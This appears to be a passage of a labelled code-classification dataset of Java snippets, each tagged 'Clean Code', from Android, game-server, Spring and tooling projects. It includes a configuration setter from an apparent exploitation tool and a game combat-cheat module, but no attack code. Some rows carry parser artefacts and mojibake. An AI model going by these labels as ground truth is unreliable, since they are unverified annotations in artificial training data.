  List<Function> functions=SQLExecutor.getInstance().functions(connection,StringUtils.isEmpty(databaseName) ? null : databaseName,StringUtils.isEmpty(schemaName) ? null : schemaName);
  if (CollectionUtils.isEmpty(functions)) {
    return functions;
  }
  return functions.stream().filter(function -> StringUtils.isNotBlank(function.getFunctionName())).map(function -> {
    String functionName=function.getFunctionName();
    function.setFunctionName(functionName.trim());
    return function;
  }
).collect(Collectors.toList());
}
",0,Clean Code
"private Object writeReplace(){
  return this;
}
",0,Clean Code
"/** 
 * Chooses the appropriate implementation depending on the Transition instances hold by the Fragments.
 */
private static FragmentTransitionImpl chooseImpl(Fragment outFragment,Fragment inFragment){
  final ArrayList<Object> transitions=new ArrayList<>();
  if (outFragment != null) {
    final Object exitTransition=outFragment.getExitTransition();
    if (exitTransition != null) {
      transitions.add(exitTransition);
    }
    final Object returnTransition=outFragment.getReturnTransition();
    if (returnTransition != null) {
      transitions.add(returnTransition);
    }
    final Object sharedReturnTransition=outFragment.getSharedElementReturnTransition();
    if (sharedReturnTransition != null) {
      transitions.add(sharedReturnTransition);
    }
  }
  if (inFragment != null) {
    final Object enterTransition=inFragment.getEnterTransition();
    if (enterTransition != null) {
      transitions.add(enterTransition);
    }
    final Object reenterTransition=inFragment.getReenterTransition();
    if (reenterTransition != null) {
      transitions.add(reenterTransition);
    }
    final Object sharedEnterTransition=inFragment.getSharedElementEnterTransition();
    if (sharedEnterTransition != null) {
      transitions.add(sharedEnterTransition);
    }
  }
  if (transitions.isEmpty()) {
    return null;
  }
  if (PLATFORM_IMPL != null && canHandleAll(PLATFORM_IMPL,transitions)) {
    return PLATFORM_IMPL;
  }
  if (SUPPORT_IMPL != null && canHandleAll(SUPPORT_IMPL,transitions)) {
    return SUPPORT_IMPL;
  }
  if (PLATFORM_IMPL != null || SUPPORT_IMPL != null) {
    throw new IllegalArgumentException(""Invalid Transition types"");
  }
  return null;
}
",0,Clean Code
"private boolean ignoreFrequentlySeenButUnwantedLines(String line){
  if (line.contains(""- age ""))   return true;
  if (line.contains(""Total time for which application threads were stopped""))   return true;
  if (line.contains(""Application time: "")) {
    if (corruptedApplicationTime.parse(line) != null)     concurrentPhaseStartTimeStamp=getClock();
    return true;
  }
  if (line.contains(""Termination Attempts:""))   return true;
  if (line.contains(""Desired survivor size""))   return true;
  if (line.startsWith(""{Heap before GC invocations""))   return true;
  if (line.startsWith(""region size ""))   return true;
  if (line.startsWith(""compacting perm gen  total ""))   return true;
  if (line.startsWith(""the space ""))   return true;
  if (line.startsWith(""No shared spaces configured.""))   return true;
  if (line.startsWith(""Heap after GC invocations=""))   return true;
  if (line.startsWith(""OpenJDK""))   return true;
  if (line.equals(""}""))   return true;
  if (line.startsWith(""Java HotSpot(TM)""))   return true;
  if (line.startsWith(""CommandLine""))   return true;
  if (line.startsWith(""Memory: ""))   return true;
  return line.contains(""Allocation failed. Thread"");
}
",0,Clean Code
"/** 
 * @return a new empty instance of {@code GetRogueBuffEnhanceInfoScRsp}
 */
public static GetRogueBuffEnhanceInfoScRsp newInstance(){
  return new GetRogueBuffEnhanceInfoScRsp();
}
",0,Clean Code
"public void setPttElement(PttElement pttElement){
  this.pttElement=pttElement;
}
",0,Clean Code
"/** 
 * Appends one visible item with new Location info.  Only called from appendVisibleItemsWithoutCache().
 */
protected final int appendVisibleItemToRow(int itemIndex,int rowIndex,int location){
  int offset;
  if (mLastVisibleIndex >= 0) {
    if (mLastVisibleIndex != getLastIndex() || mLastVisibleIndex != itemIndex - 1) {
      throw new IllegalStateException();
    }
  }
  if (mLastVisibleIndex < 0) {
    if (mLocations.size() > 0 && itemIndex == getLastIndex() + 1) {
      offset=calculateOffsetAfterLastItem(rowIndex);
    }
 else {
      offset=0;
    }
  }
 else {
    offset=location - mProvider.getEdge(mLastVisibleIndex);
  }
  Location loc=new Location(rowIndex,offset,0);
  mLocations.addLast(loc);
  Object item;
  if (mPendingItem != null) {
    loc.size=mPendingItemSize;
    item=mPendingItem;
    mPendingItem=null;
  }
 else {
    loc.size=mProvider.createItem(itemIndex,true,mTmpItem,false);
    item=mTmpItem[0];
  }
  if (mLocations.size() == 1) {
    mFirstIndex=mFirstVisibleIndex=mLastVisibleIndex=itemIndex;
  }
 else {
    if (mLastVisibleIndex < 0) {
      mFirstVisibleIndex=mLastVisibleIndex=itemIndex;
    }
 else {
      mLastVisibleIndex++;
    }
  }
  mProvider.addItem(item,itemIndex,loc.size,rowIndex,location);
  return loc.size;
}",0,Clean Code
"@Override public void handle(GameSession session,byte[] data) throws Exception {
  var req=DeleteFriendCsReq.parseFrom(data);
  session.getPlayer().getFriendList().deleteFriend(req.getUid());
  session.send(CmdId.DeleteFriendScRsp);
}
",0,Clean Code
"@Override public void afterTextChanged(Editable editable){
  if (processChange) {
    ImageSpan[] spans=editable.getSpans(0,editable.length(),ImageSpan.class);
    for (int i=0; i < spans.length; i++) {
      editable.removeSpan(spans[i]);
    }
    Emoji.replaceEmoji(editable,commentTextView.getEditText().getPaint().getFontMetricsInt(),AndroidUtilities.dp(20),false);
    processChange=false;
  }
  int beforeLimit;
  codepointCount=Character.codePointCount(editable,0,editable.length());
  boolean sendButtonEnabledLocal=true;
  if (currentLimit > 0 && (beforeLimit=currentLimit - codepointCount) <= 100) {
    if (beforeLimit < -9999) {
      beforeLimit=-9999;
    }
    captionLimitView.setNumber(beforeLimit,captionLimitView.getVisibility() == View.VISIBLE);
    if (captionLimitView.getVisibility() != View.VISIBLE) {
      captionLimitView.setVisibility(View.VISIBLE);
      captionLimitView.setAlpha(0);
      captionLimitView.setScaleX(0.5f);
      captionLimitView.setScaleY(0.5f);
    }
    captionLimitView.animate().setListener(null).cancel();
    captionLimitView.animate().alpha(1f).scaleX(1f).scaleY(1f).setDuration(100).start();
    if (beforeLimit < 0) {
      sendButtonEnabledLocal=false;
      captionLimitView.setTextColor(getThemedColor(Theme.key_windowBackgroundWhiteRedText));
    }
 else {
      captionLimitView.setTextColor(getThemedColor(Theme.key_windowBackgroundWhiteGrayText));
    }
  }
 else {
    captionLimitView.animate().alpha(0).scaleX(0.5f).scaleY(0.5f).setDuration(100).setListener(new AnimatorListenerAdapter(){
      @Override public void onAnimationEnd(      Animator animation){
        captionLimitView.setVisibility(View.GONE);
      }
    }
);
  }
  if (sendButtonEnabled != sendButtonEnabledLocal) {
    sendButtonEnabled=sendButtonEnabledLocal;
    if (sendButtonColorAnimator != null) {
      sendButtonColorAnimator.cancel();
    }
    sendButtonColorAnimator=ValueAnimator.ofFloat(sendButtonEnabled ? 0 : 1f,sendButtonEnabled ? 1f : 0);
    sendButtonColorAnimator.addUpdateListener(valueAnimator -> {
      sendButtonEnabledProgress=(float)valueAnimator.getAnimatedValue();
      int color=getThemedColor(Theme.key_dialogFloatingIcon);
      int defaultAlpha=Color.alpha(color);
      writeButton.setColorFilter(new PorterDuffColorFilter(ColorUtils.setAlphaComponent(color,(int)(defaultAlpha * (0.58f + 0.42f * sendButtonEnabledProgress))),PorterDuff.Mode.MULTIPLY));
      selectedCountView.invalidate();
    }
);
    sendButtonColorAnimator.setDuration(150).start();
  }
}",0,Clean Code
"/** 
 * {@return the immutable configuration}
 */
public Neo4jVectorStoreConfig build(){
  return new Neo4jVectorStoreConfig(this);
}",0,Clean Code
"public String toString(){
  return ""GProRecommendV2Channel{guildId="" + this.guildId + "",guildName=""+ this.guildName+ "",guildProfile=""+ this.guildProfile+ "",guildIcon=""+ this.guildIcon+ "",stateList=""+ this.stateList+ "",tagList=""+ this.tagList+ "",joinedGuild=""+ this.joinedGuild+ "",coverUrl=""+ this.coverUrl+ "",joinGuildSig=""+ this.joinGuildSig+ "",memberRole=""+ this.memberRole+ "",browseTimeStamp=""+ this.browseTimeStamp+ "",ownerUin=""+ this.ownerUin+ "",uniqueId=""+ this.uniqueId+ "",labelList=""+ this.labelList+ "",}"";
}",0,Clean Code
"@Override public void accept(VmValueVisitor visitor){
  visitor.visitIntSeq(this);
}
@Override public <T>T accept(VmValueConverter<T> converter,Iterable<Object> path){
  return converter.convertIntSeq(this,path);
}
",0,Clean Code
"/** 
 * @return a new empty instance of {@code RogueSeasonInfo}
 */
public static RogueSeasonInfo newInstance(){
  return new RogueSeasonInfo();
}
",0,Clean Code
"/** 
 * <code>optional uint32 hp = 8;</code>
 * @param value the hp to set
 * @return this
 */
public BattleAvatar setHp(final int value){
  bitField0_|=0x00000010;
  hp=value;
  return this;
}",0,Clean Code
"public boolean compatible(){
  return false;
}
",0,Clean Code
"static VectorFloat<?> sub(MemorySegmentVectorFloat a,int aOffset,MemorySegmentVectorFloat b,int bOffset,int length){
  MemorySegmentVectorFloat result=new MemorySegmentVectorFloat(length);
  int vectorizedLength=FloatVector.SPECIES_PREFERRED.loopBound(length);
  for (int i=0; i < vectorizedLength; i+=FloatVector.SPECIES_PREFERRED.length()) {
    var lhs=FloatVector.fromMemorySegment(FloatVector.SPECIES_PREFERRED,a.get(),a.offset(aOffset + i),ByteOrder.LITTLE_ENDIAN);
    var rhs=FloatVector.fromMemorySegment(FloatVector.SPECIES_PREFERRED,b.get(),b.offset(bOffset + i),ByteOrder.LITTLE_ENDIAN);
    var subResult=lhs.sub(rhs);
    subResult.intoMemorySegment(result.get(),result.offset(i),ByteOrder.LITTLE_ENDIAN);
  }
  for (int i=vectorizedLength; i < length; i++) {
    result.set(i,a.get(aOffset + i) - b.get(bOffset + i));
  }
  return result;
}",0,Clean Code
"public boolean parseToken(String token){
  if (this.ioType == null)   this.ioType=token;
 else   if (this.type == null)   this.type=token;
 else   if (this.name == null) {
    token=removeSemicolon(token);
    this.name=token;
    if (this.shaderStage == GlslConverter.ShaderStage.Vertex) {
switch (this.ioType) {
case ""in"":
        ;
case ""out"":
      ;
  }
}
 else {
switch (this.ioType) {
case ""in"":
{
      if (!this.vertOutAttributes.contains(this.type,this.name))       throw new RuntimeException(""fragment in attribute does not match vertex output"");
    }
case ""out"":
{
  }
}
}
this.resetState();
return true;
}
return false;
}
",0,Clean Code
"/** 
 * <code>optional uint32 roll_buff_times = 11;</code>
 * @param value the rollBuffTimes to set
 * @return this
 */
public RogueCommonBuffSelectInfo setRollBuffTimes(final int value){
  bitField0_|=0x00000020;
  rollBuffTimes=value;
  return this;
}",0,Clean Code
"@Override public void mouseEntered(final MouseEvent event){
  event.getComponent().setCursor(Cursor.getPredefinedCursor(Cursor.HAND_CURSOR));
}
",0,Clean Code
"@Override public int onStartCommand(Intent intent,int flags,int startId){
  path=intent.getStringExtra(""path"");
  int oldAccount=currentAccount;
  currentAccount=intent.getIntExtra(""currentAccount"",UserConfig.selectedAccount);
  if (!UserConfig.isValidAccount(currentAccount)) {
    stopSelf();
    return Service.START_NOT_STICKY;
  }
  if (oldAccount != currentAccount) {
    if (oldAccount != -1) {
      NotificationCenter.getInstance(oldAccount).removeObserver(this,NotificationCenter.uploadStoryProgress);
    }
    if (currentAccount != -1) {
      NotificationCenter.getInstance(currentAccount).addObserver(this,NotificationCenter.uploadStoryProgress);
    }
  }
  if (path == null) {
    stopSelf();
    return Service.START_NOT_STICKY;
  }
  if (BuildVars.LOGS_ENABLED) {
    FileLog.d(""start upload story"");
  }
  if (builder == null) {
    NotificationsController.checkOtherNotificationsChannel();
    builder=new NotificationCompat.Builder(ApplicationLoader.applicationContext);
    builder.setSmallIcon(android.R.drawable.stat_sys_upload);
    builder.setWhen(System.currentTimeMillis());
    builder.setChannelId(NotificationsController.OTHER_NOTIFICATIONS_CHANNEL);
    builder.setContentTitle(LocaleController.getString(""AppName"",R.string.AppName));
    builder.setTicker(LocaleController.getString(""StoryUploading"",R.string.StoryUploading));
    builder.setContentText(LocaleController.getString(""StoryUploading"",R.string.StoryUploading));
  }
  currentProgress=0;
  builder.setProgress(100,Math.round(100 * currentProgress),false);
  startForeground(33,builder.build());
  try {
    NotificationManagerCompat.from(ApplicationLoader.applicationContext).notify(33,builder.build());
  }
 catch (  Throwable e) {
    FileLog.e(e);
  }
  return Service.START_NOT_STICKY;
}",0,Clean Code
"@Test void embeddingActivation(){
  new ApplicationContextRunner().withPropertyValues(""spring.ai.openai.api-key=API_KEY"",""spring.ai.openai.base-url=TEST_BASE_URL"",""spring.ai.openai.embedding.enabled=false"").withConfiguration(AutoConfigurations.of(SpringAiRetryAutoConfiguration.class,RestClientAutoConfiguration.class,OpenAiAutoConfiguration.class)).run(context -> {
    assertThat(context.getBeansOfType(OpenAiEmbeddingProperties.class)).isNotEmpty();
    assertThat(context.getBeansOfType(OpenAiEmbeddingClient.class)).isEmpty();
  }
);
  new ApplicationContextRunner().withPropertyValues(""spring.ai.openai.api-key=API_KEY"",""spring.ai.openai.base-url=TEST_BASE_URL"").withConfiguration(AutoConfigurations.of(SpringAiRetryAutoConfiguration.class,RestClientAutoConfiguration.class,OpenAiAutoConfiguration.class)).run(context -> {
    assertThat(context.getBeansOfType(OpenAiEmbeddingProperties.class)).isNotEmpty();
    assertThat(context.getBeansOfType(OpenAiEmbeddingClient.class)).isNotEmpty();
  }
);
  new ApplicationContextRunner().withPropertyValues(""spring.ai.openai.api-key=API_KEY"",""spring.ai.openai.base-url=TEST_BASE_URL"",""spring.ai.openai.embedding.enabled=true"").withConfiguration(AutoConfigurations.of(SpringAiRetryAutoConfiguration.class,RestClientAutoConfiguration.class,OpenAiAutoConfiguration.class)).run(context -> {
    assertThat(context.getBeansOfType(OpenAiEmbeddingProperties.class)).isNotEmpty();
    assertThat(context.getBeansOfType(OpenAiEmbeddingClient.class)).isNotEmpty();
  }
);
}
",0,Clean Code
"/** 
 * <code>optional bool DADJOGHHEDE = 14;</code>
 * @return this
 */
public PlayerDisplaySettings clearDADJOGHHEDE(){
  bitField0_&=~0x00000020;
  dADJOGHHEDE=false;
  return this;
}",0,Clean Code
"private SVMNodeArrayProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private SVMNodeArrayProto(){
  index_=emptyIntList();
  value_=emptyDoubleList();
}
!org.eclipse.jdt.core.dom.MethodDeclaration@3bbb807e",0,Clean Code
"private boolean updateDiff(){
  try {
    savedDiff.setMatchesDatabase(binDiffFileTarget);
    savedDiff.setExportFile(primaryExportFileTarget,ESide.PRIMARY);
    savedDiff.setExportFile(secondaryExportFileTarget,ESide.SECONDARY);
  }
 catch (  final UnsupportedOperationException e) {
    logger.atSevere().withCause(e).log(""Save function diff view failed. Couldn't update diff object."");
    MessageBox.showError(parent,""Save function diff view failed. Couldn't update diff object."");
    return false;
  }
  return true;
}
",0,Clean Code
"public void setValue(String key,String value) throws ArgumentsMissMatchException {
  if (""null"".equals(value)) {
    value=null;
  }
  if (""serializeType"".equals(key) && payload != null) {
    payload.setSerializeType(value);
    return;
  }
 else   if (""encoder"".equals(key) && payload != null) {
    payload.setEncoder(value);
    return;
  }
 else   if (""output"".equals(key) && payload != null) {
    payload.setOutputType(value);
    return;
  }
 else   if (""serialVersionUID"".equals(key) && payload != null) {
    payload.setSerialVersionUID(value);
    return;
  }
 else   if (""checkRunning"".equals(key)) {
    isCheckRunning=Boolean.parseBoolean(value);
    payload.setCheckRunning(isCheckRunning);
    return;
  }
  if (exploit != null && exploit.has(key)) {
    try {
      exploit.set(key,value);
      settings.get(""exploit"").put(key,value);
      return;
    }
 catch (    Exception e) {
    }
  }
  if (bullet != null && bullet.has(key)) {
    try {
      bullet.set(key,value);
      settings.get(""bullet"").put(key,value);
      return;
    }
 catch (    Exception e) {
    }
  }
  throw new ArgumentsMissMatchException(""no key("" + ColorStyle.makeWordRed(key) + "") found"");
}
",0,Clean Code
"@EventHandler private void onReadPacket(PacketEvent.Receive event){
  if (event.packet instanceof CommandTreeS2CPacket) {
    ClientPlayNetworkHandlerAccessor handler=(ClientPlayNetworkHandlerAccessor)event.connection.getPacketListener();
    commandTreePlugins.clear();
    alias=null;
    packet.getCommandTree(CommandRegistryAccess.of(handler.getCombinedDynamicRegistries(),handler.getEnabledFeatures())).getChildren().forEach(node -> {
      String[] split=node.getName().split("":"");
      if (split.length > 1) {
        if (!commandTreePlugins.contains(split[0]))         commandTreePlugins.add(split[0]);
      }
      if (alias == null && VERSION_ALIASES.contains(node.getName())) {
        alias=node.getName();
      }
    }
);
  }
  if (!tick)   return;
  try {
    if (event.packet instanceof CommandSuggestionsS2CPacket) {
      Suggestions matches=packet.getSuggestions();
      if (matches.isEmpty()) {
        error(""An error occurred while trying to find plugins."");
        return;
      }
      for (      Suggestion suggestion : matches.getList()) {
        String pluginName=suggestion.getText();
        if (!plugins.contains(pluginName.toLowerCase()))         plugins.add(pluginName);
      }
      printPlugins();
    }
  }
 catch (  Exception e) {
    error(""An error occurred while trying to find plugins."");
  }
}",0,Clean Code
"public boolean isWriteToFile(){
  return this.mOutPath != null;
}
",0,Clean Code
"/** 
 * 閫氳繃鐝id鍒犻櫎鐝
 * @param attendanceShiftId
 */
OperationLog deleteAttendanceShift(Long attendanceShiftId);
",0,Clean Code
"public synchronized boolean removeUniqueItem(int uid,int count){
  GameItem item=this.getItemByUid(uid);
  if (item == null) {
    return false;
  }
  return removeItem(item,count);
}
",0,Clean Code
"/** 
 * <code>optional uint32 level = 10;</code>
 * @return whether the level field is set
 */
public boolean hasLevel(){
  return (bitField0_ & 0x00000008) != 0;
}",0,Clean Code
"protected void selectXOnChart(int x,int y){
  if (chartData == null || isEmpty)   return;
  double theta=Math.atan2(chartArea.centerY() + AndroidUtilities.dp(16) - y,chartArea.centerX() - x);
  float a=(float)(Math.toDegrees(theta) - 90);
  if (a < 0)   a+=360D;
  a/=360;
  float p=0;
  int newSelection=-1;
  float selectionStartA=0f;
  float selectionEndA=0f;
  for (int i=0; i < lines.size(); i++) {
    if (!lines.get(i).enabled && lines.get(i).alpha == 0) {
      continue;
    }
    if (a > p && a < p + darawingValuesPercentage[i]) {
      newSelection=i;
      selectionStartA=p;
      selectionEndA=p + darawingValuesPercentage[i];
      break;
    }
    p+=darawingValuesPercentage[i];
  }
  if (currentSelection != newSelection && newSelection >= 0) {
    currentSelection=newSelection;
    invalidate();
    pieLegendView.setVisibility(VISIBLE);
    LineViewData l=lines.get(newSelection);
    pieLegendView.setData(l.line.name,(int)values[currentSelection],l.lineColor);
    pieLegendView.measure(MeasureSpec.makeMeasureSpec(getMeasuredWidth(),MeasureSpec.AT_MOST),MeasureSpec.makeMeasureSpec(getMeasuredHeight(),MeasureSpec.AT_MOST));
    float r=rectF.width() / 2;
    int xl=(int)Math.min(rectF.centerX() + r * Math.cos(Math.toRadians((selectionEndA * 360f) - 90f)),rectF.centerX() + r * Math.cos(Math.toRadians(((selectionStartA * 360f) - 90f))));
    if (xl < 0)     xl=0;
    if (xl + pieLegendView.getMeasuredWidth() > getMeasuredWidth() - AndroidUtilities.dp((16))) {
      xl-=xl + pieLegendView.getMeasuredWidth() - (getMeasuredWidth() - AndroidUtilities.dp(16));
    }
    int yl=(int)Math.min((rectF.centerY() + r * Math.sin(Math.toRadians((selectionStartA * 360f) - 90f))),rectF.centerY() + r * Math.sin(Math.toRadians(((selectionEndA * 360f) - 90f))));
    yl=(int)Math.min(rectF.centerY(),yl);
    yl-=AndroidUtilities.dp(50);
    pieLegendView.setTranslationX(xl);
    pieLegendView.setTranslationY(yl);
    AndroidUtilities.vibrateCursor(this);
  }
  moveLegend();
}",0,Clean Code
"/** 
 * <code>repeated uint32 main_mission_id_list = 12;</code>
 * @return this
 */
public GetMissionStatusCsReq clearMainMissionIdList(){
  bitField0_&=~0x00000004;
  mainMissionIdList.clear();
  return this;
}",0,Clean Code
"@Override public void init(){
  mKeyguardEditorHelperCls=findClassIfExists(""com.android.keyguard.KeyguardEditorHelper"");
  findAndHookMethod(mKeyguardEditorHelperCls,""checkIfStartEditActivity"",new replaceHookedMethod(){
    @Override protected Object replace(    MethodHookParam param) throws Throwable {
      return null;
    }
  }
);
}
",0,Clean Code
"@EventHandler private void onTick(TickEvent.Pre event){
  if (!mc.player.isAlive() || PlayerUtils.getGameMode() == GameMode.SPECTATOR)   return;
  if (pauseOnUse.get() && (mc.interactionManager.isBreakingBlock() || mc.player.isUsingItem()))   return;
  if (onlyOnClick.get() && !mc.options.attackKey.isPressed())   return;
  if (TickRate.INSTANCE.getTimeSinceLastTick() >= 1f && pauseOnLag.get())   return;
  if (pauseOnCA.get() && Modules.get().get(CrystalAura.class).isActive() && Modules.get().get(CrystalAura.class).kaTimer > 0)   return;
  if (onlyOnLook.get()) {
    Entity targeted=mc.targetedEntity;
    if (targeted == null)     return;
    if (!entityCheck(targeted))     return;
    targets.clear();
    targets.add(mc.targetedEntity);
  }
 else {
    targets.clear();
    TargetUtils.getList(targets,this::entityCheck,priority.get(),maxTargets.get());
  }
  if (targets.isEmpty()) {
    attacking=false;
    if (wasPathing) {
      PathManagers.get().resume();
      wasPathing=false;
    }
    return;
  }
  Entity primary=targets.getFirst();
  if (autoSwitch.get()) {
    Predicate<ItemStack> predicate=null;
    FindItemResult weaponResult=InvUtils.findInHotbar(predicate);
    if (shouldShieldBreak()) {
      FindItemResult axeResult=InvUtils.findInHotbar(itemStack -> itemStack.getItem() instanceof AxeItem);
      if (axeResult.found())       weaponResult=axeResult;
    }
    InvUtils.swap(weaponResult.slot(),false);
  }
  if (!itemInHand())   return;
  attacking=true;
  if (rotation.get() == RotationMode.Always)   Rotations.rotate(Rotations.getYaw(primary),Rotations.getPitch(primary,Target.Body));
  if (pauseOnCombat.get() && PathManagers.get().isPathing() && !wasPathing) {
    PathManagers.get().pause();
    wasPathing=true;
  }
  if (delayCheck())   targets.forEach(this::attack);
}",0,Clean Code
"/** 
 * <code>optional uint32 floor_id = 13;</code>
 * @return whether the floorId field is set
 */
public boolean hasFloorId(){
  return (bitField0_ & 0x00000002) != 0;
}",0,Clean Code
"byte[] getMsgCookie();
",0,Clean Code
"private static String normalizeAbsolutePath(String path){
  if (!path.startsWith(""/"")) {
    throw new IllegalArgumentException(""Not an absolute path: "" + path);
  }
  String[] segments=path.split(Pattern.quote(""/""));
  List<String> parsedSegments=new ArrayList<>();
  for (  String segment : segments) {
    if (segment.isEmpty() || segment.equals(""."")) {
      continue;
    }
    if (segment.equals("".."")) {
      if (!parsedSegments.isEmpty()) {
        parsedSegments.remove(parsedSegments.size() - 1);
      }
    }
 else {
      parsedSegments.add(segment);
    }
  }
  if (parsedSegments.isEmpty()) {
    return ""/"";
  }
  StringBuilder normalized=new StringBuilder();
  for (  String segment : parsedSegments) {
    normalized.append('/');
    normalized.append(segment);
  }
  return normalized.toString();
}",0,Clean Code
"@Override public void calcUnionRect(final Rectangle2D rectangle){
  m_realizer.calcUnionRect(rectangle);
}",0,Clean Code
"@Override public List<CfCarParkChargingRules> getListByCondition(CfCarParkChargingRulesQuery cfCarParkChargingRulesQuery){
  CfCarParkChargingRulesExample cfCarParkChargingRulesExample=new CfCarParkChargingRulesExample();
  CfCarParkChargingRulesExample.Criteria criteria=cfCarParkChargingRulesExample.createCriteria();
  if (cfCarParkChargingRulesQuery.getMinStartTime() != null && cfCarParkChargingRulesQuery.getMinStartTime() > 0) {
    criteria.andStartTimeGreaterThanOrEqualTo(cfCarParkChargingRulesQuery.getMinStartTime());
  }
  if (cfCarParkChargingRulesQuery.getMaxStartTime() != null && cfCarParkChargingRulesQuery.getMaxStartTime() > 0) {
    criteria.andStartTimeLessThanOrEqualTo(cfCarParkChargingRulesQuery.getMaxStartTime());
  }
  if (cfCarParkChargingRulesQuery.getMinEndTime() != null && cfCarParkChargingRulesQuery.getMinEndTime() > 0) {
    criteria.andEndTimeGreaterThanOrEqualTo(cfCarParkChargingRulesQuery.getMinEndTime());
  }
  if (cfCarParkChargingRulesQuery.getMaxEndTime() != null && cfCarParkChargingRulesQuery.getMaxEndTime() > 0) {
    criteria.andEndTimeLessThanOrEqualTo(cfCarParkChargingRulesQuery.getMaxEndTime());
  }
  if (cfCarParkChargingRulesQuery.getStatus() != null) {
    criteria.andStatusEqualTo(cfCarParkChargingRulesQuery.getStatus());
  }
  if (cfCarParkChargingRulesQuery.getCarParkId() != null) {
    criteria.andCarParkIdEqualTo(cfCarParkChargingRulesQuery.getCarParkId());
  }
  if (cfCarParkChargingRulesQuery.getCarType() != null) {
    criteria.andCarTypeEqualTo(cfCarParkChargingRulesQuery.getCarType());
  }
  if (StringUtils.isNotEmpty(cfCarParkChargingRulesQuery.getOrderBy())) {
    cfCarParkChargingRulesExample.setOrderByClause(cfCarParkChargingRulesQuery.getOrderBy());
  }
 else {
    cfCarParkChargingRulesExample.setOrderByClause(""start_time ASC"");
  }
  if (cfCarParkChargingRulesQuery.getPage() != null && cfCarParkChargingRulesQuery.getSize() != null) {
    PageHelper.startPage(cfCarParkChargingRulesQuery.getPage(),cfCarParkChargingRulesQuery.getSize());
  }
  return cfCarParkChargingRulesMapper.selectByExample(cfCarParkChargingRulesExample);
}",0,Clean Code
"void onRecvMsg(ArrayList<MsgRecord> arrayList);
",0,Clean Code
"@Bean public OpenAIClient openAIClient(){
  return new OpenAIClientBuilder().credential(new AzureKeyCredential(System.getenv(""AZURE_OPENAI_API_KEY""))).endpoint(System.getenv(""AZURE_OPENAI_ENDPOINT"")).buildClient();
}
",0,Clean Code
"private int getCellHeight(int width){
switch (getViewType()) {
case DIALOG_CELL_TYPE:
    return AndroidUtilities.dp((SharedConfig.useThreeLinesLayout ? 78 : 72) + 1);
case TOPIC_CELL_TYPE:
  return AndroidUtilities.dp((SharedConfig.useThreeLinesLayout ? 76 : 64) + 1);
case DIALOG_TYPE:
return AndroidUtilities.dp(78) + 1;
case PHOTOS_TYPE:
int photoWidth=(width - (AndroidUtilities.dp(2) * (getColumnsCount() - 1))) / getColumnsCount();
return photoWidth + AndroidUtilities.dp(2);
case FILES_TYPE:
case AUDIO_TYPE:
return AndroidUtilities.dp(56);
case LINKS_TYPE:
return AndroidUtilities.dp(80);
case STICKERS_TYPE:
return AndroidUtilities.dp(58);
case USERS_TYPE:
case CONTACT_TYPE:
return AndroidUtilities.dp(64);
case INVITE_LINKS_TYPE:
return AndroidUtilities.dp(66);
case USERS2_TYPE:
return AndroidUtilities.dp(58);
case CALL_LOG_TYPE:
return AndroidUtilities.dp(61);
case BOTS_MENU_TYPE:
return AndroidUtilities.dp(36);
case SHARE_ALERT_TYPE:
return AndroidUtilities.dp(103);
case MEMBER_REQUESTS_TYPE:
return AndroidUtilities.dp(107);
case REACTED_TYPE_WITH_EMOJI_HINT:
case REACTED_TYPE:
return AndroidUtilities.dp(ReactedUsersListView.ITEM_HEIGHT_DP);
case LIMIT_REACHED_GROUPS:
return AndroidUtilities.dp(58);
case LIMIT_REACHED_LINKS:
return AndroidUtilities.dp(60);
case DIALOG_CACHE_CONTROL:
return AndroidUtilities.dp(51);
case CHECKBOX_TYPE:
return AndroidUtilities.dp(50) + 1;
}
return 0;
}",0,Clean Code
"@Override public final QuestStatus forName(final CharSequence value){
  if (value.length() == 10) {
    if (ProtoUtil.isEqual(""QUEST_NONE"",value)) {
      return QUEST_NONE;
    }
  }
  if (value.length() == 11) {
    if (ProtoUtil.isEqual(""QUEST_DOING"",value)) {
      return QUEST_DOING;
    }
    if (ProtoUtil.isEqual(""QUEST_CLOSE"",value)) {
      return QUEST_CLOSE;
    }
  }
  if (value.length() == 12) {
    if (ProtoUtil.isEqual(""QUEST_FINISH"",value)) {
      return QUEST_FINISH;
    }
    if (ProtoUtil.isEqual(""QUEST_DELETE"",value)) {
      return QUEST_DELETE;
    }
  }
  return null;
}",0,Clean Code
"@Override protected void onAuthenticated(Bundle savedInstanceState){
  setContentView(R.layout.activity_shared_prefs);
  setSupportActionBar(findViewById(R.id.toolbar));
  Uri sharedPrefUri=IntentCompat.getParcelableExtra(getIntent(),EXTRA_PREF_LOCATION,Uri.class);
  String appLabel=getIntent().getStringExtra(EXTRA_PREF_LABEL);
  if (sharedPrefUri == null) {
    finish();
    return;
  }
  mViewModel=new ViewModelProvider(this).get(SharedPrefsViewModel.class);
  mViewModel.setSharedPrefsFile(Paths.get(sharedPrefUri));
  ActionBar actionBar=getSupportActionBar();
  if (actionBar != null) {
    actionBar.setTitle(appLabel);
    actionBar.setSubtitle(mViewModel.getSharedPrefFilename());
    actionBar.setDisplayShowCustomEnabled(true);
    UIUtils.setupSearchView(actionBar,this);
  }
  mProgressIndicator=findViewById(R.id.progress_linear);
  mProgressIndicator.setVisibilityAfterHide(View.GONE);
  mProgressIndicator.show();
  RecyclerView recyclerView=findViewById(android.R.id.list);
  recyclerView.setLayoutManager(new LinearLayoutManager(this));
  recyclerView.setEmptyView(findViewById(android.R.id.empty));
  mAdapter=new SharedPrefsListingAdapter(this);
  recyclerView.setAdapter(mAdapter);
  FloatingActionButton fab=findViewById(R.id.floatingActionButton);
  UiUtils.applyWindowInsetsAsMargin(fab);
  fab.setOnClickListener(v -> {
    DialogFragment dialogFragment=new EditPrefItemFragment();
    Bundle args=new Bundle();
    args.putInt(EditPrefItemFragment.ARG_MODE,EditPrefItemFragment.MODE_CREATE);
    dialogFragment.setArguments(args);
    dialogFragment.show(getSupportFragmentManager(),EditPrefItemFragment.TAG);
  }
);
  mViewModel.getSharedPrefsMapLiveData().observe(this,sharedPrefsMap -> {
    mProgressIndicator.hide();
    mAdapter.setDefaultList(sharedPrefsMap);
  }
);
  mViewModel.getSharedPrefsSavedLiveData().observe(this,saved -> {
    if (saved) {
      UIUtils.displayShortToast(R.string.saved_successfully);
      if (mWriteAndExit) {
        finish();
        mWriteAndExit=false;
      }
    }
 else {
      UIUtils.displayShortToast(R.string.saving_failed);
    }
  }
);
  mViewModel.getSharedPrefsDeletedLiveData().observe(this,deleted -> {
    if (deleted) {
      UIUtils.displayShortToast(R.string.deleted_successfully);
      finish();
    }
 else {
      UIUtils.displayShortToast(R.string.deletion_failed);
    }
  }
);
